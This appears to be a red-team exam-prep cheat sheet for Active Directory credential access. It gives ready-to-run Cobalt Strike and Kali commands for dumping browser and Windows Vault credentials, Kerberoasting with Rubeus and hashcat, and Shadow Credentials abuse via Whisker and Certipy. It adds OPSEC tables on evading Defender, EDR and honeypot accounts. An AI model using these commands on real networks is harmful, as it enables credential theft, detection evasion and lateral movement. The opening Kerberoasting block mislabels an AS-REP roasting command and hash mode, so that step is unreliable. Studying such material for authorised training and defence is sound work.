# Credential access  

* Credentials from Web Browsers
```
execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

* Windows Credential Manager   
```
run vaultcmd /listcreds:"Windows Credentials" /all
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```

## Kerberoasting

> Request TGS tickets for accounts with SPNs set, crack offline. No LSASS touch, no admin required.

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
```

>Hashcat mode 18200  

```
.\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
```

### Prerequisites

- Valid domain user account (any privilege)
- Target account must have a `servicePrincipalName` set
- RC4 (type 23) hashes crack fastest — AES-only accounts produce type 18 (slower)

---

### Step 1 — Pre-Enumeration (Confirm SPN before attacking)

> **Honeypot Warning:** Exam environments may contain honey accounts with SPNs set as traps.
> Always enumerate ALL kerberoastable accounts first — identify suspicious service accounts
> (generic names, never logged in, description says "do not use") and **skip them**.
> Roasting a honeypot account will trigger alerts and cost OPSEC points.

#### LDAP Search — OPSEC-SAFE, filters krbtgt + disabled accounts

```sh
// Enumerate all valid kerberoastable accounts — excludes krbtgt and disabled accounts
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
```

Filter breakdown:
- `samAccountType=805306368` — user accounts only
- `servicePrincipalName=*` — SPN must be set
- `!samAccountName=krbtgt` — exclude krbtgt
- `UserAccountControl:...=2` — exclude disabled accounts

#### Native .NET ADSI — OPSEC-SAFE, no tools required

```cs
// No PowerView, no imports — works on any beacon immediately
beacon> powerpick ([adsisearcher]"(&(objectCategory=user)(servicePrincipalName=*))").FindAll() | ForEach-Object { $_.Properties['samaccountname']; $_.Properties['serviceprincipalname'] }

// Target specific account
beacon> powerpick ([adsisearcher]"(samaccountname=mssql_svc)").FindOne().Properties | Format-List
```

#### PowerView — requires powershell-import first (see below)

```cs
beacon> powerpick Get-DomainUser mssql_svc -Properties samaccountname,serviceprincipalname,description
beacon> powerpick Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,lastlogon
```

---

### Step 2 — Load PowerView into Beacon Memory (Exam Day Workflow)

**`powershell-import` is the correct CS method — reads from CS client local disk, never writes to target.**

```cs
// Step 1 — one-time per beacon session (path = CS client machine filesystem)
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

// Step 2 — all subsequent powerpick calls have PowerView loaded
beacon> powerpick Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
```

**Troubleshooting `powershell-import` "not found" error:**

```
Cause:   Path in powershell-import refers to CS CLIENT machine, not beacon host
         Verify file exists on attacker desktop before importing
Fix 1:   Confirm path — run 'dir C:\Tools\PowerSploit\Recon\PowerView.ps1' on attacker desktop directly
Fix 2:   Find actual path — dir C:\Tools\ /s /b | findstr PowerView  (on attacker desktop)
Fix 3:   Fallback to native .NET ADSI query — no imports needed (see above)
Avoid:   DO NOT upload PowerView.ps1 to target — .ps1 is heavily signatured, Defender flags on write
```

---

### Step 3 — Kerberoast with Rubeus

```cs
// OPSEC-SAFE — target specific user, single-line output for submission
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

// All kerberoastable accounts
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /nowrap

// RC4 downgrade — force type 23 hash (faster to crack) if AES supported
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /tgtdeleg /nowrap
```

Hash format in output — submit as-is (truncation is accepted by exam portal):

```
$krb5tgs$23$*mssql_svc$DOMAIN$<SPN>*$<hash>
```

---

### Crack Offline (Kali)

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

### OPSEC Pre-Check

```
Tier:          SAFE
Spawns proc:   Yes — sacrificial process via execute-assembly (fork & run)
Touches LSASS: No
Writes disk:   No — hash returned to beacon console only
Event logs:    4769 (Kerberos TGS Request) on DC — unavoidable, blend with normal traffic
EDR telemetry: .NET assembly loaded in sacrificial process; TGS RC4 request may alert
Defender sig:  Rubeus binary is known — pre-staged in CRTO lab, confirmed working
─────────────────────────────────────────────────
Safer alternative: Inline BOF kerberoast (if available) avoids fork & run process spawn entirely
Avoid:         shell setspn -Q */* — spawns cmd.exe as beacon child
Avoid:         Uploading PowerView.ps1 to target disk — Defender flags immediately
```

### OPSEC Comparison — Enumeration Methods

| Method | Spawns proc | powershell.exe | Writes disk | Defender risk |
|--------|-------------|----------------|-------------|---------------|
| `powerpick` ADSI native .NET | Yes (sacrificial) | No | No | Low |
| `powershell-import` + `powerpick` PowerView | Yes (sacrificial) | No | No (CS client only) | Low |
| `execute-assembly` ADSearch | Yes (sacrificial) | No | No | Low |
| `shell setspn -Q */*` | Yes — cmd.exe child | No | No | HIGH |
| `upload` PowerView.ps1 + dot-source | Yes | No | YES — target disk | HIGH — instant sig |

---

## Shadow Credentials

> Abuses write access to `msDS-KeyCredentialLink` on AD objects (the same attribute Windows Hello for Business uses). Add your own key credential → authenticate via PKINIT → extract NT hash. No password change, no LSASS touch.

### Prerequisites

- Write permission on target object's `msDS-KeyCredentialLink`:
  `GenericWrite` / `GenericAll` / `WriteProperty` / `WriteDacl` / `WriteOwner`
- DC must support PKINIT (cert-based Kerberos auth) — standard on most modern domains
- Domain Functional Level 2016+

> BloodHound query to find targets:
> ```cypher
> MATCH (n)-[r:GenericWrite]->(m:User) RETURN n,r,m
> MATCH (n)-[r:GenericWrite]->(m:Computer) RETURN n,r,m
> ```

### Attack Flow

```
1. Add attacker key credential → msDS-KeyCredentialLink of target object
2. Authenticate as target via PKINIT using the key pair → receive TGT
3. Use TGT + Kerberos U2U → extract target NT hash
4. PTH or use TGT directly for lateral movement
```

### Execution — CS `OPSEC-CAUTION`

```cs
// Step 1 — add shadow credential (Whisker outputs a ready-to-run Rubeus command)
beacon> execute-assembly Whisker.exe add /target:targetuser

// Step 2 — authenticate via PKINIT, get TGT and NT hash in one shot
beacon> execute-assembly Rubeus.exe asktgt /user:targetuser /certificate:<b64cert> /password:<certpass> /getcredentials /show /nowrap

// Step 3 — use TGT (pass-the-ticket)
beacon> execute-assembly Rubeus.exe ptt /ticket:<b64ticket>

// Cleanup — always remove your key after use
beacon> execute-assembly Whisker.exe list /target:targetuser
beacon> execute-assembly Whisker.exe remove /target:targetuser /deviceid:<guid>
```

### Execution — Adaptix / Kali `OPSEC-CAUTION`

```bash
# Step 1 — add shadow credential
pywhisker.py -d DOMAIN -u attacker -p 'pass' --target targetuser --action add

# Step 2 — PKINIT auth → get TGT
gettgtpkinit.py DOMAIN/targetuser -cert-pfx cert.pfx -pfx-pass <pass> targetuser.ccache
export KRB5CCNAME=targetuser.ccache

# Step 3 — extract NT hash from TGT
getnthash.py DOMAIN/targetuser -key <aes-key-from-gettgtpkinit>

# All-in-one via Certipy (cleanest from Kali)
certipy shadow auto -u attacker@DOMAIN -p 'pass' -account targetuser
# Outputs NT hash directly

# Cleanup
pywhisker.py -d DOMAIN -u attacker -p 'pass' --target targetuser --action remove --device-id <guid>
```

### OPSEC Pre-Check

```
Tier:          CAUTION
Spawns proc:   Yes — sacrificial process via execute-assembly (fork & run)
Touches LSASS: No
Writes disk:   No — cert handled in-memory by Rubeus
Event logs:    5136 (msDS-KeyCredentialLink modification)
               4768 (TGT requested via PKINIT / cert auth)
EDR telemetry: LDAP write to sensitive attribute; anomalous cert-based TGT
Defender sig:  Whisker binary is known — obfuscate or use pyWhisker from Kali
Safer alt:     Run from Kali with pyWhisker/Certipy to avoid CS binary on disk
```

### Tools

| Tool | Language | Invoke From |
|------|----------|-------------|
| Whisker | C# | `execute-assembly` |
| pyWhisker | Python | Kali shell |
| Certipy (`shadow auto`) | Python | Kali shell — all-in-one |

### When to Use

- Target user/computer has no SPN (can't Kerberoast) but you have write ACL over them
- Stealthier than LSASS dumping — no LSASS touch, no service creation
- Useful when pivoting through misconfigured delegations or owned computer accounts
- Computer account shadow creds → machine NT hash → RBCD or S4U2Self escalation path

---

